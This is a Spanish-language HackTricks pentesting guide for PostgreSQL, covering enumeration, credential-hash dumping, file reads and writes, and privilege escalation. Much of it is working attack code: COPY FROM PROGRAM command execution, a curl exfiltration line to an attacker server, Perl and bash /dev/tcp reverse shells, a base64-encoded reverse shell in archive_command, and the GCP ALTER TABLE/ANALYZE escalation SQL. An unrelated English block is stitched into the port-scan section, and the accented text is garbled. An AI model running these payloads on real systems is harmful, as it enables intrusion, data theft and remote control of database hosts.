# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si desea ver su **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulte los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obtenga [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önase al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠game** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparta sus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informaci√≥n B√°sica**

**PostgreSQL** se describe como un sistema de base de datos **objeto-relacional** que es **de c√≥digo abierto**. Este sistema no solo utiliza el lenguaje SQL, sino que tambi√©n lo mejora con caracter√≠sticas adicionales. Sus capacidades le permiten manejar una amplia gama de tipos de datos y operaciones, lo que lo convierte en una opci√≥n vers√°til para desarrolladores y organizaciones.

**Puerto predeterminado:** 5432, y si este puerto ya est√° en uso, parece que postgresql utilizar√° el siguiente puerto (probablemente 5433) que no est√© en uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Conexi√≥n y Enumeraci√≥n B√°sica
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Si al ejecutar **`\list`** encuentras una base de datos llamada **`rdsadmin`** sabr√°s que est√°s dentro de una **base de datos PostgreSQL de AWS**.
{% endhint %}

Para obtener m√°s informaci√≥n sobre **c√≥mo abusar de una base de datos PostgreSQL** consulta:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Enumeraci√≥n Autom√°tica
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Fuerza bruta**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Escaneo de puertos**

Seg√∫n [**esta investigaci√≥n**](https://www.exploit-db.com/papers/13084), cuando un intento de conexi√≥n falla, `dblink` arroja una excepci√≥n `sqlclient_unable_to_establish_sqlconnection` que incluye una explicaci√≥n del error. A continuaci√≥n se muestran ejemplos de estos detalles.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* El host est√° inactivo

`DETALLE: no se pudo conectar al servidor: No hay ruta al host ¬øEst√° el servidor ejecut√°ndose en el host "1.2.3.4" y aceptando conexiones TCP/IP en el puerto 5678?`

* El puerto est√° cerrado
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* El puerto est√° abierto
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```markdown
### PostgreSQL

#### Enumeration

When conducting a penetration test against a PostgreSQL database server, the first step is to enumerate the available databases, tables, and columns. This can be achieved using various methods such as querying system tables, using built-in functions, or tools like `pg_dump` and `pg_dumpall`.

#### Brute Forcing

If credentials are not known, brute forcing can be attempted using tools like `Hydra` or `Patator`. It's important to note that brute forcing should be a last resort due to the potential for account lockouts and detection by security mechanisms.

#### Exploitation

Common vulnerabilities in PostgreSQL include weak credentials, SQL injection, and insecure configurations. Exploiting these vulnerabilities can lead to unauthorized access, data manipulation, and in some cases, complete compromise of the database server.

#### Post-Exploitation

After gaining access to the database server, post-exploitation activities may include exfiltrating sensitive data, creating backdoors for future access, or escalating privileges to gain further control over the system.

#### Countermeasures

To secure a PostgreSQL database server, best practices such as using strong, unique passwords, regularly updating the software, and implementing network security measures should be followed. Additionally, conducting regular security assessments and penetration tests can help identify and address potential vulnerabilities before they are exploited by malicious actors.
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* El puerto est√° abierto o filtrado
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
En las funciones PL/pgSQL, actualmente no es posible obtener detalles de excepciones. Sin embargo, si tienes acceso directo al servidor PostgreSQL, puedes recuperar la informaci√≥n necesaria. Si extraer nombres de usuario y contrase√±as de las tablas del sistema no es factible, puedes considerar utilizar el m√©todo de ataque de lista de palabras discutido en la secci√≥n anterior, ya que podr√≠a dar resultados positivos.

## Enumeraci√≥n de Privilegios

### Roles

| Tipos de Roles |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | El rol tiene privilegios de superusuario                                                                                                             |
| rolinherit     | El rol hereda autom√°ticamente los privilegios de los roles de los que es miembro                                                                      |
| rolcreaterole  | El rol puede crear m√°s roles                                                                                                                        |
| rolcreatedb    | El rol puede crear bases de datos                                                                                                                    |
| rolcanlogin    | El rol puede iniciar sesi√≥n. Es decir, este rol puede ser dado como identificador de autorizaci√≥n de sesi√≥n inicial.                                |
| rolreplication | El rol es un rol de replicaci√≥n. Un rol de replicaci√≥n puede iniciar conexiones de replicaci√≥n y crear y eliminar espacios de replicaci√≥n.         |
| rolconnlimit   | Para roles que pueden iniciar sesi√≥n, establece el n√∫mero m√°ximo de conexiones simult√°neas que este rol puede realizar. -1 significa sin l√≠mite. |
| rolpassword    | No es la contrase√±a (siempre se muestra como `********`)                                                                                              |
| rolvaliduntil  | Hora de vencimiento de la contrase√±a (solo se usa para autenticaci√≥n de contrase√±a); nulo si no hay vencimiento                                      |
| rolbypassrls   | El rol omite todas las pol√≠ticas de seguridad a nivel de fila, consulta [Secci√≥n 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) para m√°s informaci√≥n. |
| rolconfig      | Valores predeterminados espec√≠ficos del rol para variables de configuraci√≥n en tiempo de ejecuci√≥n                                                |
| oid            | ID del rol                                                                                                                                          |

#### Grupos Interesantes

* Si eres miembro de **`pg_execute_server_program`** puedes **ejecutar** programas
* Si eres miembro de **`pg_read_server_files`** puedes **leer** archivos
* Si eres miembro de **`pg_write_server_files`** puedes **escribir** archivos

{% hint style="info" %}
Ten en cuenta que en Postgres un **usuario**, un **grupo** y un **rol** son lo **mismo**. Solo depende de **c√≥mo lo uses** y si lo **permites iniciar sesi√≥n**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablas
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funciones
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Acciones en el sistema de archivos

### Leer directorios y archivos

Desde este [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) los miembros del grupo definido **`DEFAULT_ROLE_READ_SERVER_FILES`** (llamado **`pg_read_server_files`**) y los **super usuarios** pueden utilizar el m√©todo **`COPY`** en cualquier ruta (ver `convert_and_check_filename` en `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Recuerda que si no eres un superusuario pero tienes permisos **CREATEROLE** puedes **hacerte miembro de ese grupo:**
```sql
GRANT pg_read_server_files TO username;
```
[**M√°s informaci√≥n.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Hay **otras funciones de postgres** que se pueden utilizar para **leer archivos o listar un directorio**. Solo pueden usarlas **superusuarios** y **usuarios con permisos expl√≠citos**:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Puedes encontrar **m√°s funciones** en [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Escritura de Archivos Simple

Solo los **super usuarios** y los miembros de **`pg_write_server_files`** pueden usar copy para escribir archivos.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Recuerda que si no eres un superusuario pero tienes permisos de **`CREATEROLE`** puedes **hacerte miembro de ese grupo:**
```sql
GRANT pg_write_server_files TO username;
```
[**M√°s informaci√≥n.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Recuerda que COPY no puede manejar caracteres de nueva l√≠nea, por lo tanto, incluso si est√°s utilizando una carga √∫til en base64 **debes enviar un comando en una sola l√≠nea**.\
Una limitaci√≥n muy importante de esta t√©cnica es que **`copy` no se puede utilizar para escribir archivos binarios ya que modifica algunos valores binarios.**

### **Carga de archivos binarios**

Sin embargo, existen **otras t√©cnicas para cargar archivos binarios grandes:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Consejo de recompensa por errores**: **Reg√≠strate** en **Intigriti**, una plataforma de **recompensas por errores premium creada por hackers, para hackers**. ¬°√önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE para programar**

Desde la [versi√≥n 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), solo los **super usuarios** y los miembros del grupo **`pg_execute_server_program`** pueden usar copy para RCE (ejemplo con exfiltraci√≥n:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Ejemplo para ejecutar:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Recuerda que si no eres un superusuario pero tienes los permisos **`CREATEROLE`**, puedes **hacerte miembro de ese grupo:**
```sql
GRANT pg_execute_server_program TO username;
```
[**M√°s informaci√≥n.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

O utiliza el m√≥dulo `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
M√°s informaci√≥n sobre esta vulnerabilidad [**aqu√≠**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Aunque se report√≥ como CVE-2019-9193, Postges declar√≥ que era una [caracter√≠stica y no ser√° corregida](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE con Lenguajes de PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE con extensiones de PostgreSQL

Una vez que hayas **aprendido** del post anterior **c√≥mo cargar archivos binarios**, podr√≠as intentar obtener **RCE cargando una extensi√≥n de postgresql y carg√°ndola**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE en el archivo de configuraci√≥n de PostgreSQL

El **archivo de configuraci√≥n** de postgresql es **editable** por el **usuario postgres** que es el que ejecuta la base de datos, por lo que como **superusuario** puedes escribir archivos en el sistema de archivos, y por lo tanto puedes **sobrescribir este archivo.**

![](<../.gitbook/assets/image (303).png>)

#### **RCE con ssl\_passphrase\_command**

M√°s informaci√≥n [sobre esta t√©cnica aqu√≠](https://pulsesecurity.co.nz/articles/postgres-sqli).

El archivo de configuraci√≥n tiene algunos atributos interesantes que pueden llevar a RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Ruta de la clave privada de la base de datos
* `ssl_passphrase_command = ''` Si el archivo privado est√° protegido por contrase√±a (encriptado) postgresql **ejecutar√° el comando indicado en este atributo**.
* `ssl_passphrase_command_supports_reload = off` **Si** este atributo est√° **activado**, el **comando** se ejecutar√° si la clave est√° protegida por contrase√±a cuando se ejecute `pg_reload_conf()`.

Entonces, un atacante necesitar√°:

1. **Volcar la clave privada** del servidor
2. **Encriptar** la clave privada descargada:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sobrescribir**
4. **Volcar** la **configuraci√≥n** actual de postgresql
5. **Sobrescribir** la **configuraci√≥n** con la configuraci√≥n de atributos mencionada:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Ejecutar `pg_reload_conf()`

Al probar esto, not√© que solo funcionar√° si el **archivo de clave privada tiene privilegios 640**, es **propiedad de root** y del **grupo ssl-cert o postgres** (para que el usuario postgres pueda leerlo), y est√° ubicado en _/var/lib/postgresql/12/main_.

#### **RCE con archive\_command**

**M√°s** [**informaci√≥n sobre esta configuraci√≥n y sobre WAL aqu√≠**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Otro atributo en el archivo de configuraci√≥n que es explotable es `archive_command`.

Para que esto funcione, la configuraci√≥n `archive_mode` debe ser `'on'` o `'always'`. Si es as√≠, podr√≠amos sobrescribir el comando en `archive_command` y forzar su ejecuci√≥n a trav√©s de las operaciones de WAL (write-ahead logging).

Los pasos generales son:

1. Verificar si el modo de archivo est√° habilitado: `SELECT current_setting('archive_mode')`
2. Sobrescribir `archive_command` con el payload. Por ejemplo, un shell inverso: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recargar la configuraci√≥n: `SELECT pg_reload_conf()`
4. Forzar la operaci√≥n de WAL para que se ejecute, lo que llamar√° al comando de archivo: `SELECT pg_switch_wal()` o `SELECT pg_switch_xlog()` para algunas versiones de Postgres

## **Elevaci√≥n de privilegios en Postgres**

### Elevaci√≥n de privilegios CREATEROLE

#### **Concesi√≥n**

Seg√∫n la [**documentaci√≥n**](https://www.postgresql.org/docs/13/sql-grant.html): _Los roles que tienen el privilegio **`CREATEROLE`** pueden **conceder o revocar membres√≠a en cualquier rol** que **no** sea un **superusuario**._

Entonces, si tienes el permiso de **`CREATEROLE`** podr√≠as otorgarte acceso a otros **roles** (que no sean superusuario) que pueden darte la opci√≥n de leer y escribir archivos y ejecutar comandos:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modificar Contrase√±a

Los usuarios con este rol tambi√©n pueden **cambiar** las **contrase√±as** de otros **no superusuarios**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Escalando a SUPERUSER

Es bastante com√∫n encontrar que **los usuarios locales pueden iniciar sesi√≥n en PostgreSQL sin proporcionar ninguna contrase√±a**. Por lo tanto, una vez que hayas obtenido **permisos para ejecutar c√≥digo**, puedes abusar de estos permisos para obtener el rol de **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Esto suele ser posible debido a las siguientes l√≠neas en el archivo **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

En [**este informe**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) se explica c√≥mo fue posible realizar una **escalada de privilegios** en Postgres GCP abusando del privilegio ALTER TABLE que se otorg√≥ al usuario.

Cuando intentas **hacer que otro usuario sea propietario de una tabla**, deber√≠as recibir un **error** que lo impida, pero aparentemente GCP dio esa **opci√≥n al usuario postgres que no es superusuario** en GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al unir esta idea con el hecho de que cuando se ejecutan los comandos **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) en una **tabla con una funci√≥n de √≠ndice**, la **funci√≥n** se **llama** como parte del comando con los **permisos del propietario de la tabla**. Es posible crear un √≠ndice con una funci√≥n y dar permisos de propietario a un **superusuario** sobre esa tabla, y luego ejecutar ANALYZE sobre la tabla con la funci√≥n maliciosa que podr√° ejecutar comandos porque est√° utilizando los privilegios del propietario.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Explotaci√≥n

1. Comienza creando una nueva tabla.
2. Inserta contenido irrelevante en la tabla para proporcionar datos para la funci√≥n de √≠ndice.
3. Desarrolla una funci√≥n de √≠ndice maliciosa que contenga una carga √∫til de ejecuci√≥n de c√≥digo, permitiendo la ejecuci√≥n de comandos no autorizados.
4. ALTERA el propietario de la tabla a "cloudsqladmin," que es el rol de superusuario de GCP utilizado exclusivamente por Cloud SQL para gestionar y mantener la base de datos.
5. Realiza una operaci√≥n ANALYZE en la tabla. Esta acci√≥n obliga al motor de PostgreSQL a cambiar al contexto de usuario del propietario de la tabla, "cloudsqladmin." En consecuencia, la funci√≥n de √≠ndice maliciosa se llama con los permisos de "cloudsqladmin," lo que permite la ejecuci√≥n del comando de shell previamente no autorizado.

En PostgreSQL, este flujo se ve algo as√≠:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Entonces, la tabla `shell_commands_results` contendr√° la salida del c√≥digo ejecutado:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Inicio de sesi√≥n local

Algunas instancias de PostgreSQL mal configuradas podr√≠an permitir el inicio de sesi√≥n de cualquier usuario local, es posible iniciar sesi√≥n localmente desde 127.0.0.1 utilizando la funci√≥n **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Ten en cuenta que para que la consulta anterior funcione **la funci√≥n `dblink` necesita existir**. Si no existe, puedes intentar crearla con
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Si tienes la contrase√±a de un usuario con m√°s privilegios, pero al usuario no se le permite iniciar sesi√≥n desde una IP externa, puedes usar la siguiente funci√≥n para ejecutar consultas como ese usuario:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Es posible verificar si esta funci√≥n existe con:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Funci√≥n definida personalizada con** SECURITY DEFINER

[**En este informe**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), los pentesters pudieron escalar privilegios dentro de una instancia de postgres proporcionada por IBM, porque **encontraron esta funci√≥n con la bandera SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Como [**se explica en la documentaci√≥n**](https://www.postgresql.org/docs/current/sql-createfunction.html), una funci√≥n con **SECURITY DEFINER se ejecuta** con los privilegios del **usuario que la posee**. Por lo tanto, si la funci√≥n es **vulnerable a la Inyecci√≥n SQL** o realiza algunas **acciones privilegiadas con par√°metros controlados por el atacante**, podr√≠a ser abusada para **escalar privilegios dentro de postgres**.

En la l√≠nea 4 del c√≥digo anterior se puede ver que la funci√≥n tiene la bandera **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Y luego **ejecutar comandos**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Realizar fuerza bruta con PL/pgSQL

**PL/pgSQL** es un **lenguaje de programaci√≥n completo** que ofrece un mayor control procedural en comparaci√≥n con SQL. Permite el uso de **bucles** y otras **estructuras de control** para mejorar la l√≥gica del programa. Adem√°s, las **sentencias SQL** y los **disparadores** tienen la capacidad de invocar funciones que se crean utilizando el **lenguaje PL/pgSQL**. Esta integraci√≥n permite un enfoque m√°s completo y vers√°til para la programaci√≥n y automatizaci√≥n de bases de datos.\
**Puedes abusar de este lenguaje para pedirle a PostgreSQL que realice fuerza bruta en las credenciales de los usuarios.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### registro

Dentro del archivo _**postgresql.conf**_ puedes habilitar los registros de postgresql cambiando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Luego, **reinicia el servicio**.

### pgadmin

[pgadmin](https://www.pgadmin.org) es una plataforma de administraci√≥n y desarrollo para PostgreSQL.\
Puedes encontrar **contrase√±as** dentro del archivo _**pgadmin4.db**_.\
Puedes descifrarlas usando la funci√≥n _**decrypt**_ dentro del script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

La autenticaci√≥n del cliente en PostgreSQL se gestiona a trav√©s de un archivo de configuraci√≥n llamado **pg_hba.conf**. Este archivo contiene una serie de registros, cada uno especificando un tipo de conexi√≥n, rango de direcciones IP del cliente (si corresponde), nombre de la base de datos, nombre de usuario y el m√©todo de autenticaci√≥n a utilizar para las conexiones coincidentes. El primer registro que coincida con el tipo de conexi√≥n, la direcci√≥n del cliente, la base de datos solicitada y el nombre de usuario se utiliza para la autenticaci√≥n. No hay un respaldo o alternativa si la autenticaci√≥n falla. Si ning√∫n registro coincide, se deniega el acceso.

Los m√©todos de autenticaci√≥n basados en contrase√±a disponibles en pg_hba.conf son **md5**, **crypt** y **password**. Estos m√©todos difieren en c√≥mo se transmite la contrase√±a: en formato MD5-hashed, cifrada con crypt o en texto claro. Es importante tener en cuenta que el m√©todo crypt no se puede utilizar con contrase√±as que hayan sido cifradas en pg_authid.
